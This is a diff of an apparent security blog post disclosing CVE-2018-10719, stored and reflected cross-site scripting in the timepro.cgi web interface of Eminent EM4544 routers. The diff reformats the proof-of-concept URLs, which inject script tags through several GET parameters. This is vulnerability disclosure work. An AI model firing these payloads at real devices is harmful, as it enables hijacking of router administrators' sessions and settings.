@@ -5,6 +5,12 @@ date:   2019-09-14 11:33:37 +0100
 categories: 0day
 ---
 
+<style>
+        code {
+        white-space: pre-wrap;
+        }
+</style>
+
 # CVE-2018-10719
 
 ```
@@ -12,7 +18,7 @@ categories: 0day
 
 An issue was discovered on Eminent EM4544 9.10 devices.
 Stored Cross-Site-Scripting has been found on the web interface. The
-&quot;timepro.cgi&quot; endpoint allows injections of JavaScript through the
+'timepro.cgi' endpoint allows injections of JavaScript through the
 &quot;name&quot; GET parameter. The injection is stored as part of a
 port-forwarding rule and therefore it will persist after system
 restart.
@@ -21,24 +27,7 @@ restart.
 
 [Additional Information]
 
-PoC link: http://192.168.8.1/cgi-bin/timepro.cgi?tmenu=natrouterconf&amp;
-smenu=portforward&amp;
-act=add_pf&amp;
-nf_rule_count=1&amp;
-rule_index=&amp;
-rule=5&amp;
-sel_server=0&amp;
-name=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;
-os_ip1=192&amp;
-os_ip2=168&amp;
-os_ip3=8&amp;
-os_ip4=34&amp;
-protocol=tcp&amp;
-i_port1=1&amp;
-i_port2=1&amp;
-o_port1=1&amp;
-o_port2=1
-
+PoC link: http://192.168.8.1/cgi-bin/timepro.cgi?tmenu=natrouterconf&smenu=portforward&act=add_pf&nf_rule_count=1&rule_index=&rule=5&sel_server=0&name='><script>alert(1)</script>&os_ip1=192&os_ip2=168&os_ip3=8&os_ip4=34&protocol=tcp&i_port1=1&i_port2=1&o_port1=1&o_port2=1
 ------------------------------------------
 
 [Vulnerability Type]
@@ -108,9 +97,7 @@ through the &quot;wan_name&quot; GET parameter.
 
 [Additional Information]
 
-PoC link: http://192.168.8.1/cgi-bin/timepro.cgi?tmenu=iframe&amp;
-smenu=pppoe_sched&amp;
-wan_name=wan1g0rl2%22%3E%3Cscript%3Ealert(1)%3C%2fscript%3E
+PoC link: http://192.168.8.1/cgi-bin/timepro.cgi?tmenu=iframe&smenu=pppoe_sched&wan_name=wan1g0rl2%22%3E%3Cscript%3Ealert(1)%3C%2fscript%3E
 
 ------------------------------------------
 
@@ -181,7 +168,7 @@ Reflected Cross-Site-Scripting has been found on the web interface. The
 
 [Additional Information]
 
-Link PoC: http://192.168.8.1/cgi-bin/timepro.cgi?saveconfig=1&amp;tmenu=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&amp;smenu=asd
+Link PoC: http://192.168.8.1/cgi-bin/timepro.cgi?saveconfig=1&tmenu='><script>alert(1)</script>&amp;smenu=asd
 
 ------------------------------------------
 
@@ -245,7 +232,7 @@ Reflected Cross-Site-Scripting has been found on the web interface. The
 
 [Additional Information]
 
-Link PoC: http://192.168.8.1/cgi-bin/timepro.cgi?saveconfig=1&amp;tmenu=system&amp;smenu=info&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+Link PoC: http://192.168.8.1/cgi-bin/timepro.cgi?saveconfig=1&tmenu=system&smenu=info'><script>alert(1)</script>
 
 ------------------------------------------
 
